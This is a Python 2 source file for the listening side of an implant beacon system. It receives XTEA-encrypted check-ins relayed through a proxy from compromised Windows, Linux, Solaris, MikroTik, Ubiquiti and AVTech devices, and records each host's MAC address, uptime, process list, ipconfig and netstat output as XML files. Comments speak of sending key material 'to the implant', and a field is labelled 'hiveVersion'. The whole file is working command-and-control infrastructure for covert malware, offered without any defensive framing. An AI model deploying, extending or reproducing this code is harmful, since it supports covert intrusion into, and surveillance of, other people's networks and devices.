#!/usr/bin/python
import socket
import struct
import os
import time
import getopt
import sys
import select
import logging
import logging.handlers
import bz2
import fileinput
from ctypes import *
from xml.etree.ElementTree import *

class BTHP_HDR(Structure):
	_field_ = [("version", c_ubyte), 
		   ("type", c_ubyte),
		   ("hdrLen", c_ushort),
		   ("dataLen", c_uint),
		   ("proxyId", c_uint)]


class BTHP_ADDL_HDR(Structure):
	_field_ = [("type", c_ubyte),
		   ("len", c_ubyte)]


class RSI_ARGS(Structure):
	_field_ = [("dst_ip", c_char_p),
		   ("proxy_ip", c_char_p),
		   ("beacon_ip", c_char_p),
		   ("proxyId", c_uint),
		   ("bytecount",c_uint)]

class BEACON_HDR(Structure):
	_field_ = [("version", c_ushort),
			("os", c_ushort)]

class ADDL_HDR(Structure):
	_field_ = [("type", c_ushort),
			("length", c_ushort)]

#Writes out entries to the beacon log file
class Logger:
	def __init__(self, filename=None):
		#if no log file name given use the default
		if filename == None:
			self.LOG_FILENAME = 'beacons.log'
		else:
			self.LOG_FILENAME = filename
		logging.basicConfig(filename=self.LOG_FILENAME,level=logging.DEBUG)

	def write(self, message, loglevel):
		if loglevel == logging.DEBUG:
			logging.debug('%s \n %s' % (time.strftime("%Y-%m-%d-%H:%M:%S", time.gmtime()) , message))
		elif loglevel == logging.INFO:
			logging.info('%s %s' % (time.strftime("%Y-%m-%d-%H:%M:%S", time.gmtime()) , message))
		elif loglevel == logging.WARNING:
			logging.warning('%s %s' % (time.strftime("%Y-%m-%d-%H:%M:%S", time.gmtime()) , message))
		elif loglevel == logging.ERROR:
			logging.error('%s %s' % (time.strftime("%Y-%m-%d-%H:%M:%S", time.gmtime()) , message))
		elif loglevel == logging.CRITICAL:
			logging.critical('%s %s' % (time.strftime("%Y-%m-%d-%H:%M:%S", time.gmtime()) , message))


BTHP_HDR_FMT = '>BBHII'
BTHP_ADDL_HDR_FMT = '>BB'
HDR_FMT = '>HH'
XOR_KEY = 5
MAX_CHUNK_SIZE = 4052
offset = 0
rsi_data = RSI_ARGS()
log = None
rsi_file_path = None

#generate the session key
def create_key(rand_bytes):
	offset = (ord(rand_bytes[0]) ^ XOR_KEY) % 15
	return  rand_bytes[(offset+1):(offset+17)]


def xtea_decrypt(key,block,n=32,endian="!"):
	v0,v1 = struct.unpack(endian+"2L", block)
	k = struct.unpack(endian+"4L",key)
	delta,mask = 0x9e3779b9L,0xffffffffL
	sum = (delta * n) & mask
	for round in range(n):
		v1 = (v1 - (((v0<<4 ^ v0>>5) + v0) ^ (sum + k[sum>>11 & 3]))) & mask
		sum = (sum - delta) & mask
		v0 = (v0 - (((v1<<4 ^ v1>>5) + v1) ^ (sum + k[sum & 3]))) & mask
	return struct.pack(endian+"2L",v0,v1)


def decrypt_data(key,data):
	size = len(data)
	i = 0
	ptext = ''
	while( i < size):
		if(size - i >= 8):
			ptext = ptext + xtea_decrypt(key,data[i:i+8])
		i += 8
	return ptext
	
#send back an acknowledgement with how many bytes we recieved
def send_ack(conn, received):
	rand_bytes = str(received)
	packet = create_return_packet(rand_bytes)
	try:
		conn.send(packet)
		return True

	except socket.error:
		message = "Socket error, failed to send ACK"
		log.write(message, logging.ERROR)
		conn.close()
		return False

#create  the headers and add them to the message in order to seen the data back out of the proxy	
def create_return_packet(msg):
	main_hdr = BTHP_HDR()
	addl_hdr = BTHP_ADDL_HDR()

	main_hdr.version = 1
	main_hdr.type = 2
	main_hdr.hdrLen = socket.htons(14)
	main_hdr.dataLen = socket.htonl(len(msg))
	main_hdr.proxyId = rsi_data.proxyId

	addl_hdr.type = 0
	addl_hdr.len = 0
	
	headers = struct.pack('BBHIIBB',main_hdr.version,main_hdr.type,main_hdr.hdrLen,main_hdr.dataLen,main_hdr.proxyId,addl_hdr.type,addl_hdr.len)
	return headers + msg


#extract the main bhtp header and parse through the additional headers
def parse_bthp_packet(data):
	global offset
	global rsi_data
	global log
	offset = 0
	bthp_hdr = BTHP_HDR()
	try:
		bthp_hdr.ver,bthp_hdr.type,bthp_hdr.hdrlen,bthp_hdr.datalen,rsi_data.proxyId = struct.unpack_from(BTHP_HDR_FMT, data, offset)
		rsi_data.bytecount = bthp_hdr.datalen
		offset += struct.calcsize(BTHP_HDR_FMT)
		#Verify that we have all of the bytes

		while(remove_bthp_addl_hdr(data) == True):
			pass
	except struct.error:
		message = "Parser Error: Not enough data to unpack initial bthp header!"
		log.write(message, logging.ERROR)
	
#parse data out of the bhtp additional headers	
def remove_bthp_addl_hdr(data):
	global offset
	global rsi_data
	global log
	try:
		addl_hdr = BTHP_ADDL_HDR()
		addl_hdr.type,addl_hdr.len = struct.unpack_from(BTHP_ADDL_HDR_FMT,data,offset)
		if(int(addl_hdr.type) == 0 and int(addl_hdr.len) == 0):
			offset += struct.calcsize(BTHP_ADDL_HDR_FMT)
			return False
		else:
			offset += struct.calcsize(BTHP_ADDL_HDR_FMT)
			if(int(addl_hdr.type) == 2):
				value = struct.unpack_from('>%ds' % (int(addl_hdr.len)),data,offset)
				rsi_data.beacon_ip = socket.inet_ntoa(value[0])
			elif(int(addl_hdr.type) == 3):
				value = struct.unpack_from('>%ds' % (int(addl_hdr.len)),data,offset)
				rsi_data.dst_ip = socket.inet_ntoa(value[0])
			elif(int(addl_hdr.type) == 6):
				value = struct.unpack_from('>%ds' % (int(addl_hdr.len)),data,offset)
				rsi_data.proxy_ip = socket.inet_ntoa(value[0])
			offset += int(addl_hdr.len)
		return True
	except struct.error:
			message = "Parser Error: Error parsing BTHP header"
			log.write(message, logging.ERROR)
			return false


def get_packet_size(data):
#	print "Packet size: ", len(data)	# Debug
	if len(data) == 0:
		message = "Received zero-length packet"
		log.write(message, logging.INFO)
		return 0

	size = int(ord(data[0:1]) ^ XOR_KEY)
	return int(''.join(chr(ord(a) ^ XOR_KEY) for a in data[1:size+1]))

#parse beacon headers from a full beacon packet		
def parse_beacon_data(decrypted_data):
	global log
	place = 0
	parse_error = 0
	beacon_hdr = BEACON_HDR()
	add_hdr = ADDL_HDR()
	beacon_data = {}
	try:
		#unpack beacon hdr
		beacon_hdr.version, beacon_hdr.os = struct.unpack_from(HDR_FMT, decrypted_data, place)
		place += struct.calcsize(HDR_FMT)
		#pull off data chunk and decompress if necessary
		if beacon_hdr.version >= 23:
			data = bz2.decompress(decrypted_data[place:])
			place = 0
		else:
			data = decrypted_data[place:]
			place = 0

		add_hdr.type, add_hdr.length = struct.unpack_from(HDR_FMT, data, place)
		place += struct.calcsize(HDR_FMT)
		while add_hdr.type != 0 and add_hdr.length != 0:
			#MAC address
			if add_hdr.type == 1:
				beacon_data['mac'] = ((struct.unpack_from('>%ds' % (add_hdr.length),data,place))[0].strip("\0")).replace("\b","")
				place += add_hdr.length
			#uptime
			elif add_hdr.type == 2:
				beacon_data['uptime'] = ((struct.unpack_from('>%ds' % (add_hdr.length),data,place))[0].strip("\0")).replace("\b","")
				place += add_hdr.length
			#Process list
			elif add_hdr.type == 3:
				beacon_data['proc_list'] = ((struct.unpack_from('>%ds' % (add_hdr.length),data,place))[0].strip("\0")).replace("\b","")
				place += add_hdr.length
			#ipconfig
			elif add_hdr.type == 4:
				beacon_data['ipconfig'] = ((struct.unpack_from('>%ds' % (add_hdr.length),data,place))[0].strip("\0")).replace("\b","")
				place += add_hdr.length
			#netstat -rn
			elif add_hdr.type == 5:
				beacon_data['netstat_rn'] = ((struct.unpack_from('>%ds' % (add_hdr.length),data,place))[0].strip("\0")).replace("\b","")
				place += add_hdr.length
			#netstat -an
			elif add_hdr.type == 6:
				beacon_data['netstat_an'] = ((struct.unpack_from('>%ds' % (add_hdr.length),data,place))[0].strip("\0")).replace("\b","")
				place += add_hdr.length
			elif add_hdr.type == 7:
				beacon_data['next_beacon'] = ((struct.unpack_from('>%ds' % (add_hdr.length),data,place))[0].strip("\0")).replace("\b","")
				place += add_hdr.length
			else:
				parse_error = 1
			#get next header
			add_hdr.type, add_hdr.length = struct.unpack_from(HDR_FMT, data, place)
			place += struct.calcsize(HDR_FMT)
		if parse_error != 1:
			if str(beacon_hdr.os) == '10':
				beacon_data['os'] = "Windows"
			elif str(beacon_hdr.os) == '20':
				beacon_data['os'] = "Linux-x86"
			elif str(beacon_hdr.os) == '30':
				beacon_data['os'] = "Solaris-SPARC"
			elif str(beacon_hdr.os) == '31':
				beacon_data['os'] = "Solaris-x86"
			elif str(beacon_hdr.os) == '40':
				beacon_data['os'] = "MikroTik-MIPS"
			elif str(beacon_hdr.os) == '41':
				beacon_data['os'] = "MikroTik-MIPSEL"
			elif str(beacon_hdr.os) == '42':
				beacon_data['os'] = "MikroTik-x86"
			elif str(beacon_hdr.os) == '43':
				beacon_data['os'] = "MikroTik-PPC"
			elif str(beacon_hdr.os) == '50':
				beacon_data['os'] = "Ubiquiti-MIPS"
			elif str(beacon_hdr.os) == '61':
				beacon_data['os'] = "AVTech-ARM"
			# support for legacy v2.3 beacon codes. NFI = No Further Information
			elif str(beacon_hdr.os) == '1':
				#os = "Windows"
				beacon_data['os'] = "Windows"
			elif str(beacon_hdr.os) == '2':
				#os = "Linux"
				beacon_data['os'] = "Linux-x86"
			elif str(beacon_hdr.os) == '3':
				#os = "Solaris"
				beacon_data['os'] = "Solaris-NFI"
			elif str(beacon_hdr.os) == '5':
				#os = "MikroTik"
				beacon_data['os'] = "MikroTik-NFI"
			else:
				beacon_data['os'] = "Unknown"

		
			message = "Received Version: "+ str(beacon_hdr.version) +" Beacon from ip: " + rsi_data.beacon_ip + " MAC: " + beacon_data['mac'] + " OS: " + beacon_data['os']
			log.write(message,logging.INFO)
			beacon_data['version'] = str(beacon_hdr.version)
			#beacon_data['os'] = os
			write_rsi_file(beacon_data)
		else:
			message =  "Parser Error: Unknown Header!"
			log.write(message,logging.ERROR)
	except struct.error:
		message = "Parser Error: Not enough data to finish parsing beacon from " + rsi_data.beacon_ip
		log.write(message, logging.ERROR)


def indent(elem, level=0):
	i = "\n" + level*"    "
	if len(elem):
		if not elem.text or not elem.text.strip():
			elem.text = i + "    "
		if not elem.tail or not elem.tail.strip():
			elem.tail = i
		for elem in elem:
			indent(elem, level + 1)
		if not elem.tail or not elem.tail.strip():
			elem.tail = i
	else:
		if level and (not elem.tail or not elem.tail.strip()):
			elem.tail = i
	
	
def write_rsi_file(beacon_data):
	filename = rsi_file_path + time.strftime("%Y-%m-%d-%H:%M:%S", time.localtime()) + "_" + beacon_data['mac']	+ ".rsi"
	#create root node
	root = Element("ToolHandlerFile")
	root.set("version","1.0")
	#create header node
	header = SubElement(root,'header')
	#create header node sub elements
	SubElement(header,'ID').text = ''.join(beacon_data['mac'].split('-'))
	#strip_dashes(beacon_data.mac)
	SubElement(header,'IP').text = rsi_data.proxy_ip
	SubElement(header,'dateTimeStamp').text = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
	SubElement(header,'byteCount').text = str(rsi_data.bytecount)
	SubElement(header,'dataDescription').text = 'Beacon'
	SubElement(header,'toolHandlerID').text = '88'
	#create beacon node
	beacon = SubElement(root,'beacon')
	#create Beacon sub nodes
	device_stats = SubElement(beacon, 'deviceStats')
	device_ip = SubElement(beacon, 'deviceIP')
	net_addr = SubElement(device_ip, 'networkAddress')
	#create device stats sub nodes
	SubElement(device_stats,'beaconSeqNumber').text = '0'
	SubElement(device_stats,'beaconAckNumber').text = '0'
	SubElement(device_stats,'sequenceTrigger').text = '0'
	SubElement(device_stats,'deviceUptimeSeconds').text = beacon_data['uptime']
	#create device ip sub nodes
	SubElement(net_addr, 'addressString').text = rsi_data.beacon_ip
	SubElement(net_addr, 'mask')
	#create mac addr node
	SubElement(beacon,'MACAddress').text = beacon_data['mac']
	if 'next_beacon' in beacon_data:
		next_beacon = SubElement(beacon, 'extraData')
		next_beacon.text = beacon_data['next_beacon']
		next_beacon.attrib['label'] = 'next_beacon_time'
	#create version field
	if 'version' in beacon_data:
		version = SubElement(beacon, 'extraData')
		version.text = beacon_data['version']
		version.attrib['label'] = 'hiveVersion'
	#create os field
	if 'os' in beacon_data:
		os = SubElement(beacon, 'extraData')
		os.text = beacon_data['os']
		os.attrib['label'] = 'os'
	#create proc list field
	if 'proc_list' in beacon_data:
		proc_list = SubElement(beacon, 'extraData')
		proc_list.text = beacon_data['proc_list']
		proc_list.attrib['label'] = 'processList'
	#create ipconfig field
	if 'ipconfig' in beacon_data:
		ipconfig = SubElement(beacon, 'extraData')
		ipconfig.text = beacon_data['ipconfig']
		ipconfig.attrib['label'] = 'ipconfig'
	#create netstat rn field
	if 'netstat_rn' in beacon_data:
		netstat = SubElement(beacon, 'extraData')
		netstat.text = beacon_data['netstat_rn']
		netstat.attrib['label'] = 'netstat_rn'
	#create netstat an field
	if 'netstat_an' in beacon_data:
		netstat = SubElement(beacon, 'extraData')
		netstat.text = beacon_data['netstat_an']
		netstat.attrib['label'] = 'netstat_an'
	#write xml document to a file
	indent(root)
	ElementTree(root).write(filename, encoding="utf-8")


def process_ver1_beacon(conn,key):
	global log

	try:
		data = conn.recv(4096)
	
	except socket.error:
		log.write("Read failure on socket", logging.ERROR);
		return

	parse_bthp_packet(data)
	ptext = decrypt_data(key,data[offset:])
	beacon_data = {}
	try:
		beacon_data['mac']  = (struct.unpack_from('17s',ptext,0))[0]
		beacon_data['uptime'] = str( socket.ntohl( (struct.unpack_from('L', ptext,20)) [0]) )
		message = "Received Version: 1 Beacon from ip: " + rsi_data.beacon_ip + " MAC: " + beacon_data['mac']
		log.write(message, logging.INFO)
		write_rsi_file(beacon_data)

	except struct.error:
		message = "Parser Error: Unable to parse version 1 beacon"
		log.write(message, logging.ERROR)


def process_ver2_beacon(conn,key,packet_size):
	received = 0
	chunk = ''
	data = ''
	inputs = [conn]
	while received < packet_size:
		try:
			readable,writable,execptional = select.select(inputs,[],[])

		except socket.error:
			log.write("Socket failure", logging.ERROR)
			return

		for s in readable:
			try:
				if packet_size - received >= MAX_CHUNK_SIZE:
					chunk = s.recv(MAX_CHUNK_SIZE + 44, socket.MSG_WAITALL)
				else:
					chunk = s.recv((packet_size - received) + 44, socket.MSG_WAITALL)

			except socket.error:
				log.write("Read failure on socket", logging.ERROR);
				return

			parse_bthp_packet(chunk)
			data = data + chunk[offset:]
			received += len(chunk[offset:])
			if send_ack(conn, len(chunk[offset:])) is False:
				break;
			chunk = ''

	decrypted_data = decrypt_data(key,data)
	parse_beacon_data(decrypted_data)

			
def listen_for_beacons(port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	host = ''
	rand_bytes = None
	isVer1 = False

	s.bind((host,port))

	s.listen(1)
	inputs = [s]
	while(True):
		readable,writable,execptional = select.select(inputs,[],[])
		for conn in readable:
			#accept a new connection
			conn, addr = s.accept()
			#read in the first random 32 byte message
			data = conn.recv(4096)
			# Verify that at least the header was received
			if data.__len__ < struct.calcsize(BTHP_HDR_FMT):
				message = "Short packet received"
				log.write(message, logging.ERROR)
				conn.close()
				break
			#parse the headers
			parse_bthp_packet(data)
			#check the size of the first packet to see if it is a v1 or v2 packet
			if len(data[offset:]) == 32:
				isVer1 = True
			else:
				isVer1 = False
				packet_size = get_packet_size(data[offset:])
			#generate  32 random bytes and extract our encryption key
			rand_bytes = os.urandom(32)
			key = create_key(rand_bytes)
			#send the rand bytes packet to the implant
			packet = create_return_packet(rand_bytes)
			conn.send(packet)
			if isVer1 == True:
				process_ver1_beacon(conn, key)
			else:
				process_ver2_beacon(conn, key, packet_size)
			conn.close()


def main(argv):
	global log
	global rsi_file_path
	port = None
	log_path = None
	opts, args = getopt.getopt(argv,"hp:f:l:")
	for opt, arg in opts:
		if opt == '-h':
			print 'usage:'
			print '-p <port> - the port to listen for proxy connections on'
			print '-f <rsi_file_path> - file path to write the rsi beacon files out to [default = beacons/]'
			print '-l <beacon_log_file_path> - file path to write the beacon logs out to [default = beacon_logs/]'
			sys.exit()
		elif opt in '-p':
			port = arg
		elif opt in '-f':
			rsi_file_path = arg
		elif opt in '-l':
			log_path = arg

	if(rsi_file_path == None):
		rsi_file_path = 'beacons/'
	if(port == None):
		port = 4098
	if(log_path == None):
		log_path = 'beacon_logs/'

	if os.path.exists(rsi_file_path) == False:
		os.mkdir(rsi_file_path)
	if os.path.exists(log_path) == False:
		os.mkdir(log_path)
	
	log = Logger(filename=log_path + 'beacons.log')	

	listen_for_beacons(port)


if __name__ == '__main__':
	main(sys.argv[1:])
